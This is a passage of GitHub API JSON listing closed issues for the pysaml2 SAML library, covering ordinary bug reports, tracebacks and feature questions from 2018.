StatusError", "user": {"login": "tpazderka", "id": 7734753, "node_id": "MDQ6VXNlcjc3MzQ3NTM=", "avatar_url": "https://avatars3.githubusercontent.com/u/7734753?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tpazderka", "html_url": "https://github.com/tpazderka", "followers_url": "https://api.github.com/users/tpazderka/followers", "following_url": "https://api.github.com/users/tpazderka/following{/other_user}", "gists_url": "https://api.github.com/users/tpazderka/gists{/gist_id}", "starred_url": "https://api.github.com/users/tpazderka/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tpazderka/subscriptions", "organizations_url": "https://api.github.com/users/tpazderka/orgs", "repos_url": "https://api.github.com/users/tpazderka/repos", "events_url": "https://api.github.com/users/tpazderka/events{/privacy}", "received_events_url": "https://api.github.com/users/tpazderka/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-11-26T12:33:05Z", "updated_at": "2018-12-04T13:03:32Z", "closed_at": "2018-12-04T13:03:32Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n## Code Version\r\n<!-- What version and/or branch of the code are you running? -->\r\n4.6.4\r\n## Expected Behavior\r\n<!--- Tell us what should happen -->\r\nIf client is parsing a message with error status (for example  status code `urn:oasis:names:tc:SAML:2.0:status:UnknownPrincipal`), an exception should  be raised.\r\n## Current Behavior\r\n<!--- Tell us what happens instead of the expected behavior -->\r\nNo exception is raised and a `response` object is returned from `Base.parse_authn_request_response` with no easy way of detecting the error type/message.\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\nThis has been caused by catching an Exception [here](https://github.com/IdentityPython/pysaml2/blob/v4.6.4/src/saml2/entity.py#L1210) and not propagating it further.\r\n## Steps to Reproduce\r\n<!--- Provide a link to a live example, or an unambiguous set of steps to -->\r\n<!--- reproduce this bug. Include code to reproduce, if relevant -->\r\n1. Create an XML message with error status and status code of `urn:oasis:names:tc:SAML:2.0:status:UnknownPrincipal`\r\n2. Parse the message with the client", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/569", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/569/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/569/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/569/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/569", "id": 383027450, "node_id": "MDU6SXNzdWUzODMwMjc0NTA=", "number": 569, "title": "Help in running examples", "user": {"login": "dante1119", "id": 13297856, "node_id": "MDQ6VXNlcjEzMjk3ODU2", "avatar_url": "https://avatars1.githubusercontent.com/u/13297856?v=4", "gravatar_id": "", "url": "https://api.github.com/users/dante1119", "html_url": "https://github.com/dante1119", "followers_url": "https://api.github.com/users/dante1119/followers", "following_url": "https://api.github.com/users/dante1119/following{/other_user}", "gists_url": "https://api.github.com/users/dante1119/gists{/gist_id}", "starred_url": "https://api.github.com/users/dante1119/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/dante1119/subscriptions", "organizations_url": "https://api.github.com/users/dante1119/orgs", "repos_url": "https://api.github.com/users/dante1119/repos", "events_url": "https://api.github.com/users/dante1119/events{/privacy}", "received_events_url": "https://api.github.com/users/dante1119/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": {"login": "c00kiemon5ter", "id": 97634, "node_id": "MDQ6VXNlcjk3NjM0", "avatar_url": "https://avatars0.githubusercontent.com/u/97634?v=4", "gravatar_id": "", "url": "https://api.github.com/users/c00kiemon5ter", "html_url": "https://github.com/c00kiemon5ter", "followers_url": "https://api.github.com/users/c00kiemon5ter/followers", "following_url": "https://api.github.com/users/c00kiemon5ter/following{/other_user}", "gists_url": "https://api.github.com/users/c00kiemon5ter/gists{/gist_id}", "starred_url": "https://api.github.com/users/c00kiemon5ter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/c00kiemon5ter/subscriptions", "organizations_url": "https://api.github.com/users/c00kiemon5ter/orgs", "repos_url": "https://api.github.com/users/c00kiemon5ter/repos", "events_url": "https://api.github.com/users/c00kiemon5ter/events{/privacy}", "received_events_url": "https://api.github.com/users/c00kiemon5ter/received_events", "type": "User", "site_admin": false}, "assignees": [{"login": "c00kiemon5ter", "id": 97634, "node_id": "MDQ6VXNlcjk3NjM0", "avatar_url": "https://avatars0.githubusercontent.com/u/97634?v=4", "gravatar_id": "", "url": "https://api.github.com/users/c00kiemon5ter", "html_url": "https://github.com/c00kiemon5ter", "followers_url": "https://api.github.com/users/c00kiemon5ter/followers", "following_url": "https://api.github.com/users/c00kiemon5ter/following{/other_user}", "gists_url": "https://api.github.com/users/c00kiemon5ter/gists{/gist_id}", "starred_url": "https://api.github.com/users/c00kiemon5ter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/c00kiemon5ter/subscriptions", "organizations_url": "https://api.github.com/users/c00kiemon5ter/orgs", "repos_url": "https://api.github.com/users/c00kiemon5ter/repos", "events_url": "https://api.github.com/users/c00kiemon5ter/events{/privacy}", "received_events_url": "https://api.github.com/users/c00kiemon5ter/received_events", "type": "User", "site_admin": false}], "milestone": null, "comments": 6, "created_at": "2018-11-21T09:28:59Z", "updated_at": "2019-03-18T19:27:45Z", "closed_at": "2019-02-04T16:24:43Z", "author_association": "NONE", "active_lock_reason": null, "body": "Help for running example\r\n\r\n## Code Version\r\npysaml2 4.6.3 on centos 7 python 3.5\r\n\r\n## Expected Behavior\r\nI should access the SP page after authentication on Idp \r\n\r\n## Current Behavior\r\nI get an emtpy page and the log shows:\r\n\"ValueError: WSGI Applications must yield bytes\"\r\n\r\n## Possible Solution\r\nI did try to find a fix for UTF encoding in wsgi.py , but it is not clear\r\n\r\n## Steps to Reproduce\r\n1.Just run the example as specified in relative README.rst\r\n\r\nThankyou for any help ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/555", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/555/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/555/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/555/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/555", "id": 377483417, "node_id": "MDU6SXNzdWUzNzc0ODM0MTc=", "number": 555, "title": "Eliminate wasteful namespace declarations (optimise the XML output)", "user": {"login": "spaetow", "id": 4982349, "node_id": "MDQ6VXNlcjQ5ODIzNDk=", "avatar_url": "https://avatars0.githubusercontent.com/u/4982349?v=4", "gravatar_id": "", "url": "https://api.github.com/users/spaetow", "html_url": "https://github.com/spaetow", "followers_url": "https://api.github.com/users/spaetow/followers", "following_url": "https://api.github.com/users/spaetow/following{/other_user}", "gists_url": "https://api.github.com/users/spaetow/gists{/gist_id}", "starred_url": "https://api.github.com/users/spaetow/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/spaetow/subscriptions", "organizations_url": "https://api.github.com/users/spaetow/orgs", "repos_url": "https://api.github.com/users/spaetow/repos", "events_url": "https://api.github.com/users/spaetow/events{/privacy}", "received_events_url": "https://api.github.com/users/spaetow/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-11-05T16:39:38Z", "updated_at": "2019-04-02T13:59:47Z", "closed_at": "2019-04-02T13:59:47Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm currently working some code and have noticed that for the sake of a smaller XML file, if you have a lot of declarations like this, the namespace duplication is very wasteful: \r\n```\r\n        <saml2:AttributeValue xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" \r\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \r\n            xsi:type=\"xs:string\">demouser</saml2:AttributeValue>\r\n```\r\nWouldn't it then make sense to include the namespace once at the root? This is related to #249 and #336 (the lack of declaration of namespaces for xs: types). \r\n\r\nIs there a way to optimise this somehow? See the XML assertion in \r\n[pysaml2-built-assertion-with-individual-namespace-declarations.txt](https://github.com/IdentityPython/pysaml2/files/2549550/pysaml2-built-assertion-with-individual-namespace-declarations.txt), it is 2346 bytes long.\r\n\r\nAn optimised version (see \r\n[pysaml2-built-assertion-with-root-namespace-declaration.txt](https://github.com/IdentityPython/pysaml2/files/2549570/pysaml2-built-assertion-with-root-namespace-declaration.txt) ) is only 2038 bytes long.\r\n\r\nWhile in the grand scheme of things this 308-byte difference doesn't look like much, it does mean a lot in the case we have, where every byte counts towards a 4096 octet limit. @rohe knows which case I refer to (Moonshot).", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/554", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/554/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/554/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/554/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/554", "id": 376136400, "node_id": "MDU6SXNzdWUzNzYxMzY0MDA=", "number": 554, "title": "Testing on Google App Engine and receiving error on cryptography dependency", "user": {"login": "EChu16", "id": 7033650, "node_id": "MDQ6VXNlcjcwMzM2NTA=", "avatar_url": "https://avatars3.githubusercontent.com/u/7033650?v=4", "gravatar_id": "", "url": "https://api.github.com/users/EChu16", "html_url": "https://github.com/EChu16", "followers_url": "https://api.github.com/users/EChu16/followers", "following_url": "https://api.github.com/users/EChu16/following{/other_user}", "gists_url": "https://api.github.com/users/EChu16/gists{/gist_id}", "starred_url": "https://api.github.com/users/EChu16/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/EChu16/subscriptions", "organizations_url": "https://api.github.com/users/EChu16/orgs", "repos_url": "https://api.github.com/users/EChu16/repos", "events_url": "https://api.github.com/users/EChu16/events{/privacy}", "received_events_url": "https://api.github.com/users/EChu16/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-10-31T19:58:02Z", "updated_at": "2018-10-31T20:20:44Z", "closed_at": "2018-10-31T20:20:44Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\nI've been attempting to run Pysaml2 on my Google AppEngine project and have installed pysaml2 via pip. However, when I try to execute a simple import such as `from saml2.client import Saml2Client`, I receive `ImportError: No module named cryptography.hazmat.bindings._constant_time`\r\n\r\n## Code Version\r\n<!-- What version and/or branch of the code are you running? -->\r\nI'm running the latest version of pysaml2 and have updated OpenSSL and cryptography dependencies.\r\n## Expected Behavior\r\n<!--- Tell us what should happen -->\r\n\r\n## Current Behavior\r\n<!--- Tell us what happens instead of the expected behavior -->\r\nThe error trace I get is this:\r\n```\r\nFile \"<string>\", line 9, in <module>\r\n  File \"/3p/saml2/client.py\", line 9, in <module>\r\n    from saml2.request import LogoutRequest\r\n  File \"/3p/saml2/request.py\", line 9, in <module>\r\n    from saml2.response import IncorrectlySigned\r\n  File \"/3p/saml2/response.py\", line 47, in <module>\r\n    from saml2.sigver import security_context\r\n  File \"/3p/saml2/sigver.py\", line 4, in <module>\r\n    from OpenSSL import crypto\r\n  File \"/3p/OpenSSL/__init__.py\", line 8, in <module>\r\n    from OpenSSL import crypto, SSL\r\n  File \"/3p/OpenSSL/crypto.py\", line 12, in <module>\r\n    from cryptography import x509\r\n  File \"/3p/cryptography/x509/__init__.py\", line 8, in <module>\r\n    from cryptography.x509.base import (\r\n  File \"/3p/cryptography/x509/base.py\", line 16, in <module>\r\n    from cryptography.x509.extensions import Extension, ExtensionType\r\n  File \"/3p/cryptography/x509/extensions.py\", line 18, in <module>\r\n    from cryptography.hazmat.primitives import constant_time, serialization\r\n  File \"/3p/cryptography/hazmat/primitives/constant_time.py\", line 9, in <module>\r\n    from cryptography.hazmat.bindings._constant_time import lib\r\n  File \"/3p/google_appengine/google/appengine/tools/devappserver2/python/runtime/sandbox.py\", line 1095, in load_module\r\n    raise ImportError('No module named %s' % fullname)\r\nImportError: No module named cryptography.hazmat.bindings._constant_time\r\n```\r\n\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\nI am aware that Google App Engine requires that all 3rd party libraries use pure Python code with no C extensions and I believe from what I read, Pysaml2 is fit this criteria. However, since it uses pyOpenSSL and that requires .so imports, does this mean this isn't compatible with GAE or did I mess something up during installation?\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/546", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/546/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/546/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/546/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/546", "id": 357690146, "node_id": "MDU6SXNzdWUzNTc2OTAxNDY=", "number": 546, "title": "saml.py is raising ValueError with xsd namespace", "user": {"login": "jonespm", "id": 27447, "node_id": "MDQ6VXNlcjI3NDQ3", "avatar_url": "https://avatars0.githubusercontent.com/u/27447?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jonespm", "html_url": "https://github.com/jonespm", "followers_url": "https://api.github.com/users/jonespm/followers", "following_url": "https://api.github.com/users/jonespm/following{/other_user}", "gists_url": "https://api.github.com/users/jonespm/gists{/gist_id}", "starred_url": "https://api.github.com/users/jonespm/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jonespm/subscriptions", "organizations_url": "https://api.github.com/users/jonespm/orgs", "repos_url": "https://api.github.com/users/jonespm/repos", "events_url": "https://api.github.com/users/jonespm/events{/privacy}", "received_events_url": "https://api.github.com/users/jonespm/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 7, "created_at": "2018-09-06T14:46:00Z", "updated_at": "2018-09-06T20:53:17Z", "closed_at": "2018-09-06T20:53:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\nThis fix e58e89526da18f9e0ab9d67d17a2766f3941e1ea seems like it's is causing our local logins to fail.\r\n\r\nIn our SAML response we have xsd as a namespace\r\n**xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"**\r\n\r\nAnd the type on line 215 `assert typ == \"xs:string\"`\r\n\r\nis **xsd:string** rather than **xs:string**\r\n\r\nWhich is failing this validation now. I feel like at least the namespace should possibly be ignored here or at least include xsd.\r\n\r\n## Code Version\r\n4.6.1\r\n\r\n## Expected Behavior\r\nNo error and login as before\r\n\r\n## Current Behavior\r\n\r\nError message\r\n\r\n> ValueError: \r\n> \r\n> Type and value doesn't match\r\n\r\n## Possible Solution\r\n\r\nBe more lenient on the namespace checking as the prefix doesn't matter. Maybe don't even include the prefix in the assert.\r\n\r\nhttps://stackoverflow.com/a/10603259/3708872\r\n\r\n## Steps to Reproduce\r\n<!--- Provide a link to a live example, or an unambiguous set of steps to -->\r\n<!--- reproduce this bug. Include code to reproduce, if relevant -->\r\n\r\nNot 100% sure how this is occurring. Our saml response has\r\n\r\n`<saml2p:Response Destination=\"...\" ID=\"_57a5b0cab713510ae768fb896c8dfe3c\" InResponseTo=\"id-EaxVQg3F3EFkT04HU\" IssueInstant=\"2018-09-06T14:14:16.400Z\" Version=\"2.0\" xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">`\r\n\r\nAnd then\r\n`<saml2:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xsd:string\"> . . . `\r\n\r\nWhich I believe is causing this error.\r\n\r\nI did a quick hack to just have the assert be\r\n\r\n`                         assert typ == \"xs:string\" or type == \"xsd:string\" \r\n`\r\nAnd it worked as before, but I'm sure there's something better.\r\n\r\nThanks!\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/544", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/544/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/544/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/544/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/544", "id": 356345586, "node_id": "MDU6SXNzdWUzNTYzNDU1ODY=", "number": 544, "title": "ValueError(\"Type and value doesn't match\") in correctly_signed_response()", "user": {"login": "jdavisturak", "id": 2685403, "node_id": "MDQ6VXNlcjI2ODU0MDM=", "avatar_url": "https://avatars2.githubusercontent.com/u/2685403?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jdavisturak", "html_url": "https://github.com/jdavisturak", "followers_url": "https://api.github.com/users/jdavisturak/followers", "following_url": "https://api.github.com/users/jdavisturak/following{/other_user}", "gists_url": "https://api.github.com/users/jdavisturak/gists{/gist_id}", "starred_url": "https://api.github.com/users/jdavisturak/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jdavisturak/subscriptions", "organizations_url": "https://api.github.com/users/jdavisturak/orgs", "repos_url": "https://api.github.com/users/jdavisturak/repos", "events_url": "https://api.github.com/users/jdavisturak/events{/privacy}", "received_events_url": "https://api.github.com/users/jdavisturak/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-09-03T03:15:47Z", "updated_at": "2018-09-03T15:51:02Z", "closed_at": "2018-09-03T15:51:01Z", "author_association": "NONE", "active_lock_reason": null, "body": "Code: v4.6.1\r\n\r\nI am working on an SP-initiated flow.  I have configured much it (finally), but my response from the IDP does not seem to be parsing correctly. \r\n\r\nMy intuition is that the SAML ought to encode for Deflated XML, but in this case it is not deflated, since when I paste it in  https://www.samltool.com/decode.php I see plaintext XML in the field that says \"Deflated XML\".\r\n\r\nIf this is indeed the issue, I will have something to work with.  Any help will be appreciated!\r\n\r\nThanks!\r\n\r\nBelow is the Traceback:\r\n\r\n```\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/client_base.py\", line 702, in parse_authn_request_response\r\n     binding, **kwargs)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/entity.py\", line 1142, in _parse_response\r\n     response = response.loads(xmlstr, False, origxml=origxml)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/response.py\", line 512, in loads\r\n     self._loads(xmldata, decode, origxml)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/response.py\", line 337, in _loads\r\n     **args)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/sigver.py\", line 1636, in correctly_signed_response\r\n     response = samlp.any_response_from_string(decoded_xml)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/samlp.py\", line 1847, in any_response_from_string\r\n     resp = func(xmlstr)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/samlp.py\", line 1620, in response_from_string\r\n     return saml2.create_class_from_xml_string(Response, xml_string)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 97, in create_class_from_xml_string\r\n     return create_class_from_element_tree(target_class, tree)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 127, in create_class_from_element_tree\r\n     target.harvest_element_tree(tree)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 315, in harvest_element_tree\r\n     self._convert_element_tree_to_member(child)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 485, in _convert_element_tree_to_member\r\n     create_class_from_element_tree(member_class[0], child_tree))\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 127, in create_class_from_element_tree\r\n     target.harvest_element_tree(tree)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 315, in harvest_element_tree\r\n     self._convert_element_tree_to_member(child)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 485, in _convert_element_tree_to_member\r\n     create_class_from_element_tree(member_class[0], child_tree))\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 127, in create_class_from_element_tree\r\n     target.harvest_element_tree(tree)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 315, in harvest_element_tree\r\n     self._convert_element_tree_to_member(child)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 485, in _convert_element_tree_to_member\r\n     create_class_from_element_tree(member_class[0], child_tree))\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 127, in create_class_from_element_tree\r\n     target.harvest_element_tree(tree)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 315, in harvest_element_tree\r\n     self._convert_element_tree_to_member(child)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 485, in _convert_element_tree_to_member\r\n     create_class_from_element_tree(member_class[0], child_tree))\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/__init__.py\", line 127, in create_class_from_element_tree\r\n     target.harvest_element_tree(tree)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/saml.py\", line 274, in harvest_element_tree\r\n     self.set_text(tree.text)\r\n   File \"/usr/local/lib/python2.7/dist-packages/pysaml2-file_VERSION-py2.7.egg/saml2/saml.py\", line 227, in set_text\r\n     raise ValueError(\"Type and value doesn't match\")\r\n ValueError: Type and value doesn't match\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/540", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/540/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/540/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/540/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/540", "id": 351590208, "node_id": "MDU6SXNzdWUzNTE1OTAyMDg=", "number": 540, "title": "Is it possible to validate metadata ?", "user": {"login": "stuaxo", "id": 179677, "node_id": "MDQ6VXNlcjE3OTY3Nw==", "avatar_url": "https://avatars1.githubusercontent.com/u/179677?v=4", "gravatar_id": "", "url": "https://api.github.com/users/stuaxo", "html_url": "https://github.com/stuaxo", "followers_url": "https://api.github.com/users/stuaxo/followers", "following_url": "https://api.github.com/users/stuaxo/following{/other_user}", "gists_url": "https://api.github.com/users/stuaxo/gists{/gist_id}", "starred_url": "https://api.github.com/users/stuaxo/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/stuaxo/subscriptions", "organizations_url": "https://api.github.com/users/stuaxo/orgs", "repos_url": "https://api.github.com/users/stuaxo/repos", "events_url": "https://api.github.com/users/stuaxo/events{/privacy}", "received_events_url": "https://api.github.com/users/stuaxo/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2018-08-17T13:15:45Z", "updated_at": "2018-08-30T11:21:17Z", "closed_at": "2018-08-30T11:21:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "Does PySAML2 have any functions for validating metadata files ?\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/535", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/535/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/535/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/535/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/535", "id": 349340309, "node_id": "MDU6SXNzdWUzNDkzNDAzMDk=", "number": 535, "title": "4.6.0 version is set incorrectly", "user": {"login": "jberkz", "id": 20713907, "node_id": "MDQ6VXNlcjIwNzEzOTA3", "avatar_url": "https://avatars1.githubusercontent.com/u/20713907?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jberkz", "html_url": "https://github.com/jberkz", "followers_url": "https://api.github.com/users/jberkz/followers", "following_url": "https://api.github.com/users/jberkz/following{/other_user}", "gists_url": "https://api.github.com/users/jberkz/gists{/gist_id}", "starred_url": "https://api.github.com/users/jberkz/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jberkz/subscriptions", "organizations_url": "https://api.github.com/users/jberkz/orgs", "repos_url": "https://api.github.com/users/jberkz/repos", "events_url": "https://api.github.com/users/jberkz/events{/privacy}", "received_events_url": "https://api.github.com/users/jberkz/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605569, "node_id": "MDU6TGFiZWw1NjA1NTY5", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/invalid", "name": "invalid", "color": "e6e6e6", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 7, "created_at": "2018-08-10T00:57:14Z", "updated_at": "2018-08-13T12:56:16Z", "closed_at": "2018-08-10T18:29:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "When installing with pip, the returned version is `file-VERSION` and not `4.6.0`\r\n\r\n## Code Version\r\nActive version: 4.6.0\r\n\r\n## Expected Behavior\r\n```\r\n>>>import saml2; print(saml2.__version__)\r\n4.6.0\r\n```\r\n\r\n## Current Behavior\r\n```\r\n>>>import saml2; print(saml2.__version__)\r\nfile-VERSION\r\n```\r\n\r\n## Possible Solution\r\n\r\n## Steps to Reproduce\r\n\r\n```\r\npip show pysaml2\r\n# --or--\r\nimport saml2; print(saml2.__version__)\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/534", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/534/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/534/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/534/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/534", "id": 347997433, "node_id": "MDU6SXNzdWUzNDc5OTc0MzM=", "number": 534, "title": "Tag new release?", "user": {"login": "leenaars", "id": 4158274, "node_id": "MDQ6VXNlcjQxNTgyNzQ=", "avatar_url": "https://avatars0.githubusercontent.com/u/4158274?v=4", "gravatar_id": "", "url": "https://api.github.com/users/leenaars", "html_url": "https://github.com/leenaars", "followers_url": "https://api.github.com/users/leenaars/followers", "following_url": "https://api.github.com/users/leenaars/following{/other_user}", "gists_url": "https://api.github.com/users/leenaars/gists{/gist_id}", "starred_url": "https://api.github.com/users/leenaars/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/leenaars/subscriptions", "organizations_url": "https://api.github.com/users/leenaars/orgs", "repos_url": "https://api.github.com/users/leenaars/repos", "events_url": "https://api.github.com/users/leenaars/events{/privacy}", "received_events_url": "https://api.github.com/users/leenaars/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-08-06T16:39:00Z", "updated_at": "2018-08-06T16:45:02Z", "closed_at": "2018-08-06T16:45:02Z", "author_association": "NONE", "active_lock_reason": null, "body": "It has been a while since the last release... \r\n\r\nWould it be possible to tag a release for packagers?\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/533", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/533/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/533/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/533/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/533", "id": 347913873, "node_id": "MDU6SXNzdWUzNDc5MTM4NzM=", "number": 533, "title": "alpine xmlsec-dev 1.2.25 produces \"unable to load xmlsec-openssl library.\"", "user": {"login": "hjwp", "id": 769730, "node_id": "MDQ6VXNlcjc2OTczMA==", "avatar_url": "https://avatars3.githubusercontent.com/u/769730?v=4", "gravatar_id": "", "url": "https://api.github.com/users/hjwp", "html_url": "https://github.com/hjwp", "followers_url": "https://api.github.com/users/hjwp/followers", "following_url": "https://api.github.com/users/hjwp/following{/other_user}", 